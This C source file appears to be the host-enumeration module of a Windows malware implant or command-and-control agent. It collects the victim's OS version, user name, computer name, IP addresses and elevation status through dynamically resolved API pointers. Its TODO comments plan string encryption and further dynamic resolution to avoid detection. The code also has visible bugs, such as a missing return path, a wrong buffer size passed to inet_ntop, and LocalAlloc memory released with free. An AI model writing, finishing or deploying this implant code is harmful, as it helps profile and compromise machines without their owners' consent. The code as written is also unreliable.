#include "enum.h"
#include "token.h"

//TODO finish enumeration

BOOL Enumerate(pAgent agent)
{
	//TODO: this may be an issue since we're not allocating memory manually & copying it into buffer.
	if(GetOperatingSystemFunc(agent) != 0) {
		printf("[error] attempting to get operating system information\n");
		return FALSE;
	}
	if (GetUser(agent) != 0) {
		printf("[error] attempting to get user information\n");
		return FALSE;
	}
	if ( GetCompName(agent) != 0) {
		printf("[error] attempting to get computer name\n");
		return FALSE;
	}
	if( GetIPAddress(agent) != 0) {
		printf("[error] attempting to get ip address\n");
		return FALSE;
	}

	agent->Context->Elevated = IsElevated(agent);
	return TRUE;
}

//TODO replacee all strings with encoded / encrypted content.
INT GetOperatingSystemFunc(pAgent agent) {
	LPCSTR OS = NULL;
	RTL_OSVERSIONINFOEXW lpVersionInformation = { 0 };
	lpVersionInformation.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
	NTSTATUS status = 0;
	status = agent->pRtlGetVersion(&lpVersionInformation);
	if (status != NTSUCCESS) {
		printf("[error] attempting to retrieve the operating system versions. [%08X]", status);
		return -1;
	}
	agent->Context->dwMajorVersion = lpVersionInformation.dwMajorVersion;
	agent->Context->dwMinorVersion = lpVersionInformation.dwMinorVersion;
	agent->Context->wProductType = lpVersionInformation.wProductType;
	agent->Context->dwBuildNumber = lpVersionInformation.dwBuildNumber;
	agent->Context->dwPlatformId = lpVersionInformation.dwPlatformId;
	agent->Context->wServicePackMajor = lpVersionInformation.wServicePackMajor;
	agent->Context->wServicePackMinor = lpVersionInformation.wServicePackMinor;
	agent->Context->wSuiteMask = lpVersionInformation.wSuiteMask;
	
	return 0;
}


INT GetUser(pAgent agent) {
	PVOID            Data = NULL;
	DWORD            dwLength = UNLEN + 1;

	if (Data = LocalAlloc(LPTR, dwLength)) {
		agent->pGetUserNameA(Data, &dwLength);
		agent->Context->UserName = Data;
		return 0;
	}
	return -1;
	
}


//TODO replace this with a function that obtians comptuer name from registry or from env variables.
INT GetCompName(pAgent agent) {
	PVOID            Data = NULL;
	SIZE_T           Length = 0;
	DWORD            dwLength = 0;

	if (!agent->pGetComputerNameExA(ComputerNameNetBIOS, NULL, &dwLength))
	{
		if ((Data = LocalAlloc(LPTR, dwLength)))
		{
			if (agent->pGetComputerNameExA(ComputerNameNetBIOS, Data, &dwLength))
			{
				agent->Context->ComputerName = Data;
				return 0;
			}
			else {
				LocalFree(Data);
				return -1;
			}
		}
	}

	
}
//TODO FIX THIS SHIT
INT GetIPAddress(pAgent agent) {
	WSADATA wsaData;
	DWORD dwSize = 0;
	DWORD dwRetVal = 0;
	ULONG flags = GAA_FLAG_INCLUDE_PREFIX;
	PIP_ADAPTER_ADDRESSES pAddresses = NULL, pCurrAddresses = NULL;
	PIP_ADAPTER_UNICAST_ADDRESS pUnicast = NULL;

	// Initialize Winsock
	if (agent->pWSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup failed.\n");
		return 1;
	}

	// Call GetAdaptersAddresses to determine the size needed
	dwRetVal = agent->pGetAdaptersAddresses(AF_UNSPEC, flags, NULL, pAddresses, &dwSize);
	if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
		pAddresses = (IP_ADAPTER_ADDRESSES*)LocalAlloc(LPTR, dwSize);
		if (pAddresses == NULL) {
			printf("Memory allocation failed for IP_ADAPTER_ADDRESSES struct.\n");
			agent->pWSACleanup();
			return 1;
		}
	}

	// Make the actual call to GetAdaptersAddresses
	dwRetVal = agent->pGetAdaptersAddresses(AF_UNSPEC, flags, NULL, pAddresses, &dwSize);
	if (dwRetVal == NO_ERROR) {
		
		// Iterate through all of the adapters
		for (pCurrAddresses = pAddresses; pCurrAddresses != NULL; pCurrAddresses = pCurrAddresses->Next) {
			int count = 0;
			printf("\nAdapter name: %s\n", pCurrAddresses->AdapterName);

			// Iterate through all of the unicast IP addresses
			for (pUnicast = pCurrAddresses->FirstUnicastAddress; pUnicast != NULL; pUnicast = pUnicast->Next) {
				LPSTR ip = (LPSTR)LocalAlloc(LPTR, INET6_ADDRSTRLEN);
				void* addr;

				if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
					addr = &((struct sockaddr_in*)pUnicast->Address.lpSockaddr)->sin_addr;
				}
				else {
					addr = &((struct sockaddr_in6*)pUnicast->Address.lpSockaddr)->sin6_addr;
				}

				agent->pInetNtop(pUnicast->Address.lpSockaddr->sa_family, addr, ip, sizeof(ip));
				agent->Context->IPAddress[count] = ip;
				count++;
			}
		}
	}
	else {
		printf("Call to GetAdaptersAddresses failed.\n");
	}

	if (pAddresses) {
		free(pAddresses);
	}

	agent->pWSACleanup();
	return 0;
}

BOOL IsElevated(
	pAgent agent
) {
	HANDLE Token = { 0 };
	BOOL   Admin = FALSE;

	/* query if current process token is elevated or not */
	if ((Token = TokenCurrentHandle(agent))) {
		Admin = TokenElevated(Token, agent);
	}

	/* close token handle */
	if (Token) {
		agent->pNtClose(Token); //TODO redifine NtClose through dynamic resolution.
	}

	return Admin;
}